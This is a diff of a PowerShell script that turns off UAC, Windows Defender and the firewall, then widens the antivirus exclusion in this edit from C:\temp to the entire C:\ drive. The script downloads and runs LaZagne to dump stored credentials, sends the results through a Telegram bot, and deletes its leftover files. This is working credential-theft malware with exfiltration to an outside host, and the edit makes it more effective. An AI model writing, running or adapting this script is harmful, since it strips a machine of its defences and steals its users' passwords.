@@ -3,17 +3,15 @@
 # Disabling the UAC
 Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
 
-# Disabling the Firewall Part 1
+# Disabling the Firewal
 Set-MpPreference -DisableRealtimeMonitoring $true
-
-# Disabling the Firewall Part 2
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
-# Disabling the Virus and Threat Protection
+# Disabling the WD Protection
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 
-# Adding an exclusion path
-Add-MpPreference -ExclusionPath "C:\temp"
+# Adding an exclusion
+Add-MpPreference -ExclusionPath "C:\"
 
 # Download LaZagne and execute it
 $Test = "C:\temp"
@@ -69,7 +67,7 @@ try {
 # Send the result file
 Send-TelegramFile -BotToken $BotToken -ChatID $ChatID -FilePath $ResultFile
 
-# Cleanup
+# Cleanup left files
 Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue
 
 # Exit
